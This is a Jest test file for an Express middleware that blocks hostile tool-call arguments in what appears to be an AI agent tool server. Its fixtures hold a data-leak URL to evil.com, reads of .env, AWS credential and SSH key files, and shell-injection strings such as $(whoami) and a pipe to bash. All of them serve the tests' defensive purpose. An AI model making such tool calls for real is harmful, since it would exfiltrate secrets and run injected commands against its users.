import type { Request, Response, NextFunction } from "express";
import { astEgressFilter } from "../src/middleware/ast-egress-filter.js";

function createMockReq(body: Record<string, unknown>): Partial<Request> {
  return {
    body,
    ip: "127.0.0.1",
  };
}

function createMockRes(): Partial<Response> {
  const res: Partial<Response> = {
    status: jest.fn((code: number) => {
      return res as Response;
    }),
    json: jest.fn((body: unknown) => {
      return res as Response;
    }),
  };
  return res;
}

describe("astEgressFilter", () => {
  let stderrSpy: jest.SpyInstance;

  beforeEach(() => {
    stderrSpy = jest.spyOn(process.stderr, "write").mockImplementation(() => true);
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  it("blocks ShadowLeak: URL with 3+ single-char query params", () => {
    const req = createMockReq({
      method: "tools/call",
      params: {
        name: "fetch_url",
        arguments: {
          url: "https://evil.com/exfil?a=x&b=y&c=z",
        },
      },
    });

    const res = createMockRes();
    const next = jest.fn();

    astEgressFilter(req as Request, res as Response, next as NextFunction);

    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
    const body = (res.json as jest.Mock).mock.calls[0][0];
    expect(body.error.code).toBe("SHADOWLEAK_DETECTED");
    expect(stderrSpy).toHaveBeenCalled();
  });

  it("blocks sensitive path: .env file reference", () => {
    const req = createMockReq({
      method: "tools/call",
      params: {
        name: "read_file",
        arguments: {
          path: "/home/user/project/.env",
        },
      },
    });

    const res = createMockRes();
    const next = jest.fn();

    astEgressFilter(req as Request, res as Response, next as NextFunction);

    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
    const body = (res.json as jest.Mock).mock.calls[0][0];
    expect(body.error.code).toBe("SENSITIVE_PATH_BLOCKED");
  });

  it("blocks sensitive path: .aws/credentials", () => {
    const req = createMockReq({
      method: "tools/call",
      params: {
        name: "read_file",
        arguments: {
          path: "/home/user/.aws/credentials",
        },
      },
    });

    const res = createMockRes();
    const next = jest.fn();

    astEgressFilter(req as Request, res as Response, next as NextFunction);

    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
    const body = (res.json as jest.Mock).mock.calls[0][0];
    expect(body.error.code).toBe("SENSITIVE_PATH_BLOCKED");
  });

  it("blocks shell injection: $(whoami)", () => {
    const req = createMockReq({
      method: "tools/call",
      params: {
        name: "execute",
        arguments: {
          command: "echo $(whoami)",
        },
      },
    });

    const res = createMockRes();
    const next = jest.fn();

    astEgressFilter(req as Request, res as Response, next as NextFunction);

    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
    const body = (res.json as jest.Mock).mock.calls[0][0];
    expect(body.error.code).toBe("SHELL_INJECTION_BLOCKED");
  });

  it("blocks shell injection: backtick execution", () => {
    const req = createMockReq({
      method: "tools/call",
      params: {
        name: "execute",
        arguments: {
          command: "echo `whoami`",
        },
      },
    });

    const res = createMockRes();
    const next = jest.fn();

    astEgressFilter(req as Request, res as Response, next as NextFunction);

    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
    const body = (res.json as jest.Mock).mock.calls[0][0];
    expect(body.error.code).toBe("SHELL_INJECTION_BLOCKED");
  });

  it("blocks shell injection: pipe chain to bash", () => {
    const req = createMockReq({
      method: "tools/call",
      params: {
        name: "execute",
        arguments: {
          command: "echo hello | bash -c 'ls'",
        },
      },
    });

    const res = createMockRes();
    const next = jest.fn();

    astEgressFilter(req as Request, res as Response, next as NextFunction);

    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
    const body = (res.json as jest.Mock).mock.calls[0][0];
    expect(body.error.code).toBe("SHELL_INJECTION_BLOCKED");
  });

  it("allows clean legitimate arguments", () => {
    const req = createMockReq({
      method: "tools/call",
      params: {
        name: "search",
        arguments: {
          query: "How to deploy Node.js application to production",
          limit: 10,
        },
      },
    });

    const res = createMockRes();
    const next = jest.fn();

    astEgressFilter(req as Request, res as Response, next as NextFunction);

    expect(next).toHaveBeenCalledTimes(1);
    expect(res.status).not.toHaveBeenCalled();
  });

  it("allows empty body with no arguments", () => {
    const req = createMockReq({});
    const res = createMockRes();
    const next = jest.fn();

    astEgressFilter(req as Request, res as Response, next as NextFunction);

    expect(next).toHaveBeenCalledTimes(1);
    expect(res.status).not.toHaveBeenCalled();
  });

  it("blocks deeply nested sensitive paths", () => {
    const req = createMockReq({
      method: "tools/call",
      params: {
        name: "multi_read",
        arguments: {
          files: [
            { path: "/tmp/safe.txt" },
            { path: "/root/.ssh/id_rsa" },
          ],
        },
      },
    });

    const res = createMockRes();
    const next = jest.fn();

    astEgressFilter(req as Request, res as Response, next as NextFunction);

    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
    const body = (res.json as jest.Mock).mock.calls[0][0];
    expect(body.error.code).toBe("SENSITIVE_PATH_BLOCKED");
  });
});
